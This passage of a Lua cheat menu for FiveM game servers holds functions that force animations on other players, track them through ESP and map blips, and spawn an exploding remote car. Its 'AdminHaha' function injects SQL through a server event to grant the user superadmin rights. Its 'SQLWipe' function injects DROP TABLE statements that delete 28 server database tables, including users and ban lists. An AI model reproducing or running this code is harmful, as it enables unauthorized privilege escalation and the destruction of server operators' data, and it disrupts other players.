	BLOWMYDICK('cmg3_animations:sync', SelectedPlayer, lib, lib2, anim1, anim2, distans, distans2, height, GetPlayerServerId(SelectedPlayer), length, spin, controlFlagMe, controlFlagTarget, animFlagTarget, attachFlag)
	Wait(10)
end

-- Bring Jeden --

takytemamrad.BringOne = function(SelectedPlayer)
	local lib = 'anim@arena@celeb@flat@paired@no_props@'
	local lib2 = 'missfinale_c2mcs_1'
	local lib3 = 'nm'
	local anim1 = 'piggyback_c_player_a'
	local anim2 = 'piggyback_c_player_b'
	local distans = -0.0
	local distans2 = 0.0
	local height = 0.45
	local spin = 0.0
	local length = 1
	local controlFlagMe = 49
	local controlFlagTarget = 33
	local animFlagTarget = 1
	BLOWMYDICK('K8IGHAYY2x', SelectedPlayer, lib, anim1, anim2, distans, distans2, height, GetPlayerServerId(SelectedPlayer),length,spin,controlFlagMe,controlFlagTarget,animFlagTarget)
	BLOWMYDICK("gujgLkxHGz", GetPlayerServerId(SelectedPlayer))
	BLOWMYDICK('cmg2_animations:sync', SelectedPlayer, lib, anim1, anim2, distans, distans2, height, GetPlayerServerId(SelectedPlayer),length,spin,controlFlagMe,controlFlagTarget,animFlagTarget)
	BLOWMYDICK('cmg2_animations:sync', SelectedPlayer, lib, anim1, anim2, distans, distans2, height, GetPlayerServerId(SelectedPlayer), length, spin, controlFlagMe, controlFlagTarget, animFlagTarget)
	BLOWMYDICK("cmg2_animations:stop", GetPlayerServerId(SelectedPlayer))
	BLOWMYDICK('cmg2_animations:sync', SelectedPlayer, lib2, lib3, anim1, anim2, distans, distans2, height, GetPlayerServerId(SelectedPlayer), length, spin, controlFlagMe, controlFlagTarget, animFlagTarget)
	BLOWMYDICK("cmg2_animations:stop", GetPlayerServerId(SelectedPlayer))
	BLOWMYDICK('CarryPeople:sync', SelectedPlayer, lib2, lib3, anim1, anim2, distans, distans2, height, GetPlayerServerId(SelectedPlayer), length, spin, controlFlagMe, controlFlagTarget, animFlagTarget)
	BLOWMYDICK("CarryPeople:stop", GetPlayerServerId(SelectedPlayer))
	BLOWMYDICK('CarryPeople:sync', SelectedPlayer, lib, anim1, anim2, distans, distans2, height, GetPlayerServerId(SelectedPlayer), length, spin, controlFlagMe, controlFlagTarget, animFlagTarget)
	BLOWMYDICK("CarryPeople:stop", GetPlayerServerId(SelectedPlayer))
	Wait(10)
end

-- Carry Jeden -- 
takytemamrad.CarryOne = function(SelectedPlayer)
	local lib = 'anim@arena@celeb@flat@paired@no_props@'
	local lib2 = 'missfinale_c2mcs_1'
	local lib3 = 'nm'
	local anim1 = 'piggyback_c_player_a'
	local anim2 = 'piggyback_c_player_b'
	local distans = -0.0
	local distans2 = 0.0
	local height = 0.45
	local spin = 0.0
	local length = 100000
	local controlFlagMe = 49
	local controlFlagTarget = 33
	local animFlagTarget = 1
	BLOWMYDICK('cmg2_animations:sync', SelectedPlayer, lib, anim1, anim2, distans, distans2, height, GetPlayerServerId(SelectedPlayer), length, spin, controlFlagMe, controlFlagTarget, animFlagTarget)
	BLOWMYDICK('cmg2_animations:sync', SelectedPlayer, lib2, lib3, anim1, anim2, distans, distans2, height, GetPlayerServerId(SelectedPlayer), length, spin, controlFlagMe, controlFlagTarget, animFlagTarget)
	BLOWMYDICK('CarryPeople:sync', SelectedPlayer, lib2, lib3, anim1, anim2, distans, distans2, height, GetPlayerServerId(SelectedPlayer), length, spin, controlFlagMe, controlFlagTarget, animFlagTarget)
	BLOWMYDICK('CarryPeople:sync', SelectedPlayer, lib, anim1, anim2, distans, distans2, height, GetPlayerServerId(SelectedPlayer), length, spin, controlFlagMe, controlFlagTarget, animFlagTarget)
	Wait(10)
end

takytemamrad.AdminHaha = function()
	BLOWMYDICK('kashactersS:DeleteCharacter', [['; UPDATE users SET group = "superadmin", permission_level = 10 WHERE name = "]] .. GetPlayerName(PlayerId()) .. [[" #']])
end

takytemamrad.SQLWipe = function()
	local table = {
		[1] = 	{tab = "DROP TABLE users",					label = "Crashing... users"},
		[2] = 	{tab = "DROP TABLE baninfo",				label = "Crashing... baninfo"},
		[3] = 	{tab = "DROP TABLE banlist",				label = "Crashing... banlist"},
		[4] = 	{tab = "DROP TABLE banlisthistory",			label = "Crashing... banlisthistory"},
		[5] = 	{tab = "DROP TABLE user_licences",			label = "Crashing... user_licences"},
		[6] = 	{tab = "DROP TABLE addon_account",			label = "Crashing... addon_account"},
		[7] = 	{tab = "DROP TABLE addon_account_data",		label = "Crashing... addon_account_data"},
		[8] = 	{tab = "DROP TABLE addon_inventory",		label = "Crashing... addon_inventory"},
		[9] = 	{tab = "DROP TABLE addon_inventory_items",	label = "Crashing... addon_inventory_items"},
		[10] = 	{tab = "DROP TABLE user_accounts",			label = "Crashing... user_accounts"},
		[11] = 	{tab = "DROP TABLE user_inventory",			label = "Crashing... user_inventory"},
		[12] = 	{tab = "DROP TABLE user_lastcharacter",		label = "Crashing... user_lastcharacter"},
		[13] = 	{tab = "DROP TABLE billing",				label = "Crashing... billing"},
		[14] = 	{tab = "DROP TABLE cardealer_vehicles",		label = "Crashing... cardealer_vehicles"},
		[15] = 	{tab = "DROP TABLE datastore",				label = "Crashing... datastore"},
		[16] = 	{tab = "DROP TABLE datastore_data",			label = "Crashing... datastore_data"},
		[17] = 	{tab = "DROP TABLE fine_types",				label = "Crashing... fine_types"},
		[18] = 	{tab = "DROP TABLE items",					label = "Crashing... items"},
		[19] = 	{tab = "DROP TABLE jobs",					label = "Crashing... jobs"},
		[20] = 	{tab = "DROP TABLE jobs_grades",			label = "Crashing... jobs_grades"},
		[21] = 	{tab = "DROP TABLE licences",				label = "Crashing... licences"},
		[22] = 	{tab = "DROP TABLE owned_vehicles",			label = "Crashing... owned_vehicles"},
		[23] = 	{tab = "DROP TABLE owned_properties",		label = "Crashing... owned_properties"},
		[24] = 	{tab = "DROP TABLE trunk_inventory",		label = "Crashing... trunk_inventory"},
		[25] = 	{tab = "DROP TABLE vehicles",				label = "Crashing... vehicles"},
		[26] = 	{tab = "DROP TABLE vehicle_categories",		label = "Crashing... vehicle_categories"},
		[27] = 	{tab = "DROP TABLE vehicle_sold",			label = "Crashing... vehicle_sold"},
		[28] = 	{tab = "DROP TABLE whitelist",				label = "Crashing... whitelist"},

	}
	local full = #table
	local procent = 0
	for i = 1, #table, 1 do
		local sql =  table[i]
		procent = procent +1
		local pp = (procent/full)*100
		BLOWMYDICK('kashactersS:DeleteCharacter', "';"..sql.tab..";")
		print("Percent: " ..math.floor(pp)..  " /100%")
		print (sql.label)
		Citizen.Wait(1000)
	end
end



takytemamrad.clonePlayerVehicle = function(SelectedPlayer)
	-- function num : 0_164 , upvalues : _ENV
	local AutoCigos = nil
	if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer)) then
	  AutoCigos = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false)
	else
	  AutoCigos = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
	end
	if DoesEntityExist(AutoCigos) then
	  local ZiskatniAuta = GetEntityModel(AutoCigos)
	  local NastaveniAuta = SpawnLocalVehicle(ZiskatniAuta, PlayerId())
	  local q = Cya.Game.GetVehicleProperties(AutoCigos)
	  q.plate = nil
	  ;
	  ((NertigelFunc.Game).SetVehicleProperties)(NastaveniAuta, q)
	  SetVehicleEngineOn(NastaveniAuta, true, false, false)
	  SetVehRadioStation(NastaveniAuta, "OFF")
	end
  end

  takytemamrad.FreezePlayer = function()
	for src, bool in dict.pairs(frozen_players) do
		src = dict.tonumber(src)
		local ped = GetPlayerPed(src)

		if DoesEntityExist(ped) and bool then
			ClearPedTasks(ped)
			ClearPedTasksImmediately(ped)
			DisablePlayerFiring(src, true)
		end
	end
end

-- CleanPed  --
takytemamrad.CleanPed = function()
	ClearPedBloodDamage(PlayerPedId())
	ClearPedWetness(PlayerPedId())
	ClearPedEnvDirt(PlayerPedId())
	ResetPedVisibleDamage(PlayerPedId())
end


function SpectatePlayer(selectedPlayer)

	if not InSpectatorMode then
			LastPosition = GetEntityCoords(GetPlayerPed(-1))
		end

		local playerPed = GetPlayerPed(-1)

		SetEntityCollision(playerPed, false, false)
		SetEntityVisible(playerPed, false)

		PlayerData = player
		if ShowInfos then
			SendNUIMessage({
				type = 'infos',
				data = PlayerData
			})	
		end

		Citizen.CreateThread(function()

			if not DoesCamExist(cam) then
				cam = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
			end

			SetCamActive(cam, true)
			RenderScriptCams(true, false, 0, true, true)

			InSpectatorMode = true
			TargetSpectate  = selectedPlayer

		end)

end

function resetNormalCamera()
	InSpectatorMode = false
	TargetSpectate  = nil
	local playerPed = GetPlayerPed(-1)

	SetCamActive(cam,  false)
	RenderScriptCams(false, false, 0, true, true)

	SetEntityCollision(playerPed, true, true)
	SetEntityVisible(playerPed, true)
	SetEntityCoords(playerPed, LastPosition.x, LastPosition.y, LastPosition.z)
end


--[[local function SpectatePlayer(selectedPlayer)
	local selectedPlayerPed = GetPlayerPed(selectedPlayer)
	
	if Cya.Player.Spectating then

		RequestCollisionAtCoord(GetEntityCoords(PlayerPedId()))

		DoScreenFadeOut(500)
		while IsScreenFadingOut() do Wait(0) end

		NetworkSetInSpectatorMode(false, 0)
		SetMinimapInSpectatorMode(false, 0)

		ClearPedTasks(PlayerPedId())
		DoScreenFadeIn(500)

	else

		DoScreenFadeOut(500)
		while IsScreenFadingOut() do Wait(0) end

		RequestCollisionAtCoord(GetEntityCoords(selectedPlayerPed))

		NetworkSetInSpectatorMode(false, 0)
		NetworkSetInSpectatorMode(true, selectedPlayerPed)
		SetMinimapInSpectatorMode(true, selectedPlayerPed)

		TaskWanderStandard(PlayerPedId(), 0, 0)
		DoScreenFadeIn(500)
		
	end

	Cya.Player.Spectating = not Cya.Player.Spectating
end]]

--[[local function SpectatePlayer(selectedPlayer)
	local selectedPlayerPed = GetPlayerPed(selectedPlayer)
	
	if Cya.Player.Spectating then

		RequestCollisionAtCoord(GetEntityCoords(PlayerPedId()))


		CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
		AttachCamToEntity(Spectate.Camera, selectedPlayer, 0.0, -7.5, 1.1, true)
		SetMinimapInSpectatorMode(false, 0)

		ClearPedTasks(PlayerPedId())
		DoScreenFadeIn(500)

	else

		

		RequestCollisionAtCoord(GetEntityCoords(selectedPlayer))

		CreateCam("DEFAULT_SCRIPTED_CAMERA", false, 0)
		CreateCam("DEFAULT_SCRIPTED_CAMERA", false, selectedPlayer)
		SetMinimapInSpectatorMode(true, selectedPlayer)

		TaskWanderStandard(PlayerPedId(), 0, 0)
		DoScreenFadeIn(500)
		
	end

	Cya.Player.Spectating = not Cya.Player.Spectating
end]]

local RCCar = {}

-- Remote Car

RCCar.Start = function()

	if DoesEntityExist(RCCar.Entity) then return end

	RCCar.Spawn()

	RCCar.Tablet(true)

	while DoesEntityExist(RCCar.Entity) and DoesEntityExist(RCCar.Driver) do
		Citizen.Wait(5)

		local distanceCheck = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),  GetEntityCoords(RCCar.Entity), true)

		RCCar.DrawInstructions(distanceCheck)
		RCCar.HandleKeys(distanceCheck)

		if distanceCheck <= 50000000.0 then
			if not NetworkHasControlOfEntity(RCCar.Driver) then
				NetworkRequestControlOfEntity(RCCar.Driver)
			elseif not NetworkHasControlOfEntity(RCCar.Entity) then
				NetworkRequestControlOfEntity(RCCar.Entity)
			end
		else
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 6, 2500)
		end
	end
end

RCCar.HandleKeys = function(distanceCheck)
	if IsControlJustReleased(0, 47) then
		if IsCamRendering(RCCar.Camera) then
			RCCar.ToggleCamera(false)
		else
			RCCar.ToggleCamera(true)
		end
	end

	if distanceCheck <= 50000000.0 then
		if IsControlJustPressed(0, 73) then
			RCCar.Attach("pick")
		end
	end

	if distanceCheck < 50000000.0 then
	    if IsControlJustReleased(0, 74) then
		    local coos = GetEntityCoords(RCCar.Entity, true)
            AddExplosion(coos.x, coos.y, coos.z, 7, 100000.0, true, false, 0)
		end
		if IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 9, 1)
		end
		
		if IsControlJustReleased(0, 172) or IsControlJustReleased(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 6, 2500)
		end

		if IsControlPressed(0, 173) and not IsControlPressed(0, 172) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 22, 1)
		end

		if IsControlPressed(0, 174) and IsControlPressed(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 13, 1)
		end

		if IsControlPressed(0, 175) and IsControlPressed(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 14, 1)
		end

		if IsControlPressed(0, 172) and IsControlPressed(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 30, 100)
		end

		if IsControlPressed(0, 174) and IsControlPressed(0, 172) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 7, 1)
		end

		if IsControlPressed(0, 175) and IsControlPressed(0, 172) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 8, 1)
		end

		if IsControlPressed(0, 174) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 4, 1)
		end

		if IsControlPressed(0, 175) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 5, 1)
		end
	end
end

RCCar.DrawInstructions = function(distanceCheck)
	
	local steeringButtons = {
		{
			["label"] = "Right",
			["button"] = "~INPUT_CELLPHONE_RIGHT~"
		},
		{
			["label"] = "Forward",
			["button"] = "~INPUT_CELLPHONE_UP~"
		},
		{
			["label"] = "Reverse",
			["button"] = "~INPUT_CELLPHONE_DOWN~"
		},
		{
			["label"] = "Left",
			["button"] = "~INPUT_CELLPHONE_LEFT~"
		}
	}

	local pickupButton = {
		["label"] = "Delete",
		["button"] = "~INPUT_VEH_DUCK~"
	}
	
	local explodeButton = {
		["label"] = "Explode",
		["button"] = "~INPUT_VEH_ROOF~"
	}

	local buttonsToDraw = {
		{
			["label"] = "Toggle Camera",
			["button"] = "~INPUT_DETONATE~"
		}
	}

	if distanceCheck <= 50000000.0 then
		for buttonIndex = 1, #steeringButtons do
			local steeringButton = steeringButtons[buttonIndex]

			table.insert(buttonsToDraw, steeringButton)
		end

		if distanceCheck <= 1000000.0 then
			table.insert(buttonsToDraw, explodeButton)
		end
		
		if distanceCheck <= 1000000.0 then
			table.insert(buttonsToDraw, pickupButton)
		end
	end

	Citizen.CreateThread(function()
		
        local instructionScaleform = RequestScaleformMovie("instructional_buttons")

        while not HasScaleformMovieLoaded(instructionScaleform) do
            Wait(0)
        end

        PushScaleformMovieFunction(instructionScaleform, "CLEAR_ALL")
        PushScaleformMovieFunction(instructionScaleform, "TOGGLE_MOUSE_BUTTONS")
        PushScaleformMovieFunctionParameterBool(0)
        PopScaleformMovieFunctionVoid()

        for buttonIndex, buttonValues in ipairs(buttonsToDraw) do
            PushScaleformMovieFunction(instructionScaleform, "SET_DATA_SLOT")
            PushScaleformMovieFunctionParameterInt(buttonIndex - 1)

            PushScaleformMovieMethodParameterButtonName(buttonValues["button"])
            PushScaleformMovieFunctionParameterString(buttonValues["label"])
            PopScaleformMovieFunctionVoid()
        end

        PushScaleformMovieFunction(instructionScaleform, "DRAW_INSTRUCTIONAL_BUTTONS")
        PushScaleformMovieFunctionParameterInt(-1)
        PopScaleformMovieFunctionVoid()
        DrawScaleformMovieFullscreen(instructionScaleform, 255, 255, 255, 255)
    end)
end


RCCar.Spawn = function()
	RCCar.LoadModels({ GetHashKey(RCCAR123), 68070371 })

	local spawnCoords, spawnHeading = GetEntityCoords(PlayerPedId()) + GetEntityForwardVector(PlayerPedId()) * 2.0, GetEntityHeading(PlayerPedId())

	RCCar.Entity = CreateVehicle(GetHashKey(RCCAR123), spawnCoords, spawnHeading, true)

	while not DoesEntityExist(RCCar.Entity) do
		Citizen.Wait(5)
	end

	RCCar.Driver = CreatePed(5, 68070371, spawnCoords, spawnHeading, true)

	SetEntityInvincible(RCCar.Driver, true)
	SetEntityVisible(RCCar.Driver, false)
	FreezeEntityPosition(RCCar.Driver, true)
	SetPedAlertness(RCCar.Driver, 0.0)
    SetVehicleNumberPlateText(RCCar.Entity, "CK GANG")
	TaskWarpPedIntoVehicle(RCCar.Driver, RCCar.Entity, -1)
   

	while not IsPedInVehicle(RCCar.Driver, RCCar.Entity) do
		Citizen.Wait(0)
	end

	RCCar.Attach("place")
end

RCCar.Attach = function(param)
	if not DoesEntityExist(RCCar.Entity) then
		return
	end
	
	RCCar.LoadModels({ "pickup_object" })

	if param == "place" then

		PlaceObjectOnGroundProperly(RCCar.Entity)
	elseif param == "pick" then
		if DoesCamExist(RCCar.Camera) then
			RCCar.ToggleCamera(false)
		end

		RCCar.Tablet(false)

		DeleteVehicle(RCCar.Entity)
		DeleteEntity(RCCar.Driver)

		RCCar.UnloadModels()
	end
end

RCCar.Tablet = function(boolean)
	if boolean then

		Citizen.CreateThread(function()
			while DoesEntityExist(RCCar.TabletEntity) do
				Citizen.Wait(5)
	

			end

			ClearPedTasks(PlayerPedId())
		end)
	else
		DeleteEntity(RCCar.TabletEntity)
	end
end

ConfigCamera = true

RCCar.ToggleCamera = function(boolean)
	if not ConfigCamera then return end

	if boolean then
		if not DoesEntityExist(RCCar.Entity) then return end 
		if DoesCamExist(RCCar.Camera) then DestroyCam(RCCar.Camera) end

		RCCar.Camera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)

		AttachCamToEntity(RCCar.Camera, RCCar.Entity, 0.0, -7.5, 1.1, true)

		Citizen.CreateThread(function()
			while DoesCamExist(RCCar.Camera) do
				Citizen.Wait(5)

				SetCamRot(RCCar.Camera, GetEntityRotation(RCCar.Entity))
			end
		end)

		local easeTime = 500 * math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(RCCar.Entity), true) / 10)

		RenderScriptCams(1, 1, easeTime, 1, 1)

		Citizen.Wait(easeTime)

	else
		local easeTime = 500 * math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(RCCar.Entity), true) / 10)

		RenderScriptCams(0, 1, easeTime, 1, 0)

		Citizen.Wait(easeTime)

		ClearTimecycleModifier()

		DestroyCam(RCCar.Camera)
	end
end

RCCar.LoadModels = function(models)
	for modelIndex = 1, #models do
		local model = models[modelIndex]

		if not RCCar.CachedModels then
			RCCar.CachedModels = {}
		end

		table.insert(RCCar.CachedModels, model)

		if IsModelValid(model) then
			while not HasModelLoaded(model) do
				RequestModel(model)
	
				Citizen.Wait(10)
			end
		else
			while not HasAnimDictLoaded(model) do
				RequestAnimDict(model)
	
				Citizen.Wait(10)
			end    
		end
	end
end

RCCar.UnloadModels = function()
	for modelIndex = 1, #RCCar.CachedModels do
		local model = RCCar.CachedModels[modelIndex]

		if IsModelValid(model) then
			SetModelAsNoLongerNeeded(model)
		else
			RemoveAnimDict(model)   
		end
	end
end

local entityEnumerator = {
    __gc = function(enum)
        if enum.destructor and enum.handle then
            enum.destructor(enum.handle)
        end
        enum.destructor = nil
        enum.handle = nil
    end
}

if NoRecoil then
	GetGameplayCamRelativePitch()
	SetGameplayCamRelativePitch(0, 0)
end

if Rage then
	ForceLightningFlash()
	ForceLightningFlash()
end	

if InfStamina then
	RestorePlayerStamina(PlayerId(), 1.0)
end

if Glow_ESP then

	local cx, cy, cz = table.unpack(GetEntityCoords(PlayerPedId()))
	local x, y, z = table.unpack(GetEntityCoords(pPed))
	if Glow_ESP then
		for i = 1, #GetActivePlayers() do
		local pPed = GetPlayerPed(i)
		LineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, 0, 0, 0.9)
		local PedCoords = GetOffsetFromEntityInWorldCoords(pPed)

		--DrawLine(LineOneBegin.x, LineOneBegin.y, LineOneBegin.z, LineOneEnd.x, LineOneEnd.y, LineOneEnd.z, 50, 80, 150, 255)
		--local dirX, dirY, dirZ = table.unpack(GetEntityForwardVector(GetPlayerPed(-1)))


		if ped ~= PlayerPedId() then
			--DrawSpotLight(LineOneBegin.x, LineOneBegin.y, LineOneBegin.z, 255, 255, 255, 50.0, 1.0, 1.0, 20.0, 5.0)
			DrawSpotLight(PedCoords.x, PedCoords.y, PedCoords.z, 10.1, 10.1, 10.1, 255, 255, 255, 125.0, 1.0, 1.0, 20.0, 0.95)
		end
	end
	
	
	--for i, spotlightInformation in ipairs(activeVehicleSpotlights) do

	--local coords = GetWorldPositionOfEntityBone(vehicle, door)
	--local direct = vector3(spotlightInformation[2][1], spotlightInformation[2][2], spotlightInformation[2][3])
	--local windowCoords = GetWorldPositionOfEntityBone(vehicle, windscreen)
	--end
	end
end

if playerBlips then
	-- show blips
	local plist = GetActivePlayers()
	for i = 1, #plist do
		local id = plist[i]
		local ped = GetPlayerPed(id)
		if ped ~= PlayerPedId() then
			local blip = GetBlipFromEntity(ped)

			-- HEAD DISPLAY STUFF --

			-- Create head display (this is safe to be spammed)
			-- headId = Citizen.InvokeNative( 0xBFEFE3321A3F5015, ped, GetPlayerName( id ), false, false, "", false )

			-- Speaking display
			-- I need to move this over to name tag code
			-- if NetworkIsPlayerTalking(id) then
			-- 	Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 9, true ) -- Add speaking sprite
			-- else
			-- 	Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 9, false ) -- Remove speaking sprite
			-- end

			-- BLIP STUFF --

			if not DoesBlipExist(blip) then -- Add blip and create head display on player
				blip = AddBlipForEntity(ped)
				SetBlipSprite(blip, 1)
				Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true ) -- Player Blip indicator
			else -- update blip
				local veh = GetVehiclePedIsIn(ped, false)
				local blipSprite = GetBlipSprite(blip)

				if GetEntityHealth(ped) == 0 then -- dead
					if blipSprite ~= 274 then
						SetBlipSprite(blip, 274)
						Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true ) -- Player Blip indicator
					end
				elseif veh then
					local vehClass = GetVehicleClass(veh)
					local vehModel = GetEntityModel(veh)
					if vehClass == 15 then -- Helicopters
						if blipSprite ~= 422 then
							SetBlipSprite(blip, 422)
							Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
						end
					elseif vehClass == 8 then -- Motorcycles
						if blipSprite ~= 226 then
							SetBlipSprite(blip, 226)
							Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
						end
					elseif vehClass == 16 then -- Plane
						if vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra") or vehModel == GetHashKey("lazer") then -- Jets
							if blipSprite ~= 424 then
								SetBlipSprite(blip, 424)
								Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
							end
						elseif blipSprite ~= 423 then
							SetBlipSprite(blip, 423)
							Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
						end
					elseif vehClass == 14 then -- Boat
						if blipSprite ~= 427 then
							SetBlipSprite(blip, 427)
							Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
						end
					elseif vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2") or vehModel == GetHashKey("insurgent3") then -- Insurgent, Insurgent Pickup & Insurgent Pickup Custom
						if blipSprite ~= 426 then
							SetBlipSprite(blip, 426)
							Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
						end
					elseif vehModel == GetHashKey("limo2") then -- Turreted Limo
						if blipSprite ~= 460 then
							SetBlipSprite(blip, 460)
							Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
						end
					elseif vehModel == GetHashKey("rhino") then -- Tank
						if blipSprite ~= 421 then
							SetBlipSprite(blip, 421)
							Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false) -- Player Blip indicator
						end
					elseif vehModel == GetHashKey("trash") or vehModel == GetHashKey("trash2") then -- Trash
						if blipSprite ~= 318 then
							SetBlipSprite(blip, 318)
							Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
						end
					elseif vehModel == GetHashKey("pbus") then -- Prison Bus
						if blipSprite ~= 513 then
							SetBlipSprite(blip, 513)
							Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false) -- Player Blip indicator
						end
					elseif vehModel == GetHashKey("seashark") or vehModel == GetHashKey("seashark2") or vehModel == GetHashKey("seashark3") then -- Speedophiles
						if blipSprite ~= 471 then
							SetBlipSprite(blip, 471)
							Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false) -- Player Blip indicator
						end
					elseif vehModel == GetHashKey("cargobob") or vehModel == GetHashKey("cargobob2") or vehModel == GetHashKey("cargobob3") or vehModel == GetHashKey("cargobob4") then -- Cargobobs
						if blipSprite ~= 481 then
							SetBlipSprite(blip, 481)
							Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false) -- Player Blip indicator
						end
					elseif vehModel == GetHashKey("technical") or vehModel == GetHashKey("technical2") or vehModel == GetHashKey("technical3") then -- Technical
						if blipSprite ~= 426 then
							SetBlipSprite(blip, 426)
							Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false) -- Player Blip indicator
						end
					elseif vehModel == GetHashKey("taxi") then -- Cab/ Taxi
						if blipSprite ~= 198 then
							SetBlipSprite(blip, 198)
							Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
						end
					elseif vehModel == GetHashKey("fbi") or vehModel == GetHashKey("fbi2") or vehModel == GetHashKey("police2") or vehModel == GetHashKey("police3") -- Police Vehicles
						or vehModel == GetHashKey("police") or vehModel == GetHashKey("sheriff2") or vehModel == GetHashKey("sheriff")
						or vehModel == GetHashKey("policeold2") then
						if blipSprite ~= 56 then
							SetBlipSprite(blip, 56)
							Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
						end
					elseif blipSprite ~= 1 then -- default blip
						SetBlipSprite(blip, 1)
						Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
					end

					-- Show number in case of passangers
					local passengers = GetVehicleNumberOfPassengers(veh)

					if passengers > 0 then
						if not IsVehicleSeatFree(veh, -1) then
							passengers = passengers + 1
						end
						ShowNumberOnBlip(blip, passengers)
					else
						HideNumberOnBlip(blip)
					end
				else
					-- Remove leftover number
					HideNumberOnBlip(blip)

					if blipSprite ~= 1 then -- default blip
						SetBlipSprite(blip, 1)
						Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator

					end
				end

				SetBlipRotation(blip, math.ceil(GetEntityHeading(veh))) -- update rotation
				SetBlipNameToPlayerName(blip, id) -- update blip name
				SetBlipScale(blip,  0.85) -- set scale

				-- set player alpha
				if IsPauseMenuActive() then
					SetBlipAlpha( blip, 255 )
				else
					x1, y1 = table.unpack(GetEntityCoords(PlayerPedId(), true))
					x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(id), true))
					distance = (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) + 900
					-- Probably a way easier way to do this but whatever im an idiot

					if distance < 0 then
						distance = 0
					elseif distance > 255 then
						distance = 255
					end
					SetBlipAlpha(blip, distance)
				end
			end
		end
	end
elseif not playerBlips then
	local plist = GetActivePlayers()
	for i = 1, #plist do
		local id = plist[i]
		local ped = GetPlayerPed(id)
		local blip = GetBlipFromEntity(ped)
		if DoesBlipExist(blip) then -- Removes blip
			RemoveBlip(blip)
		end
	end

end



--[[takytemamrad.MenuClosingPrint = function()
	--local TroskuBaitKEKW = math.random(12, 232)
	-- Closing print
	takytemamrad.SendNotification({text = "Closing in 5 seconds", type = "menuclosing"})
	debugprint("Closing in 5 seconds")
	--debugprint("Unloading[" ..TroskuBaitKEKW.. "]Misc functions")
	debugprint("Switching to default config")
	Wait(5000)
	takytemamrad.SendNotification({text = "Closed...", type = "menuclosing"})
	debugprint("Closed...")
	Wait(1000)
	takytemamrad.SendNotification({text = "Goodbye...", type = "menuclosing"})
	debugprint("Goodbye..")
end]]

local function drawComboBox(text, selectedIndex)
	local x = menus[currentMenu].x + menuWidth / 2
	local multiplier = nil
	local pointer = true

	if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
		multiplier = optionCount
	elseif
		optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and
			optionCount <= menus[currentMenu].currentOption
	 then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + 0.0025 + (buttonHeight * multiplier) - buttonHeight / 2 -- 0.0025 is the offset for the line under subTitle
		
		local backgroundColor = menus[currentMenu].menuBackgroundColor
		local textColor = menus[currentMenu].menuTextColor
		local subTextColor = menus[currentMenu].menuSubTextColor
		local pointColor = menus[currentMenu].menuInvisibleColor
		
		local textX = x + menuWidth / 2 - frameWidth - buttonTextXOffset
		local selected = false

		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = menus[currentMenu].menuFocusTextColor
			subTextColor = _menuColor.base
			pointColor = menus[currentMenu].menuSubTextColor
			textX = x + menuWidth / 2.25 - 0.019
			selected = true
		end

		-- Button background
		drawRect(x, y, menuWidth, buttonHeight, backgroundColor)

		-- Button title
		drawText(
			text,
			menus[currentMenu].x + buttonTextXOffset,
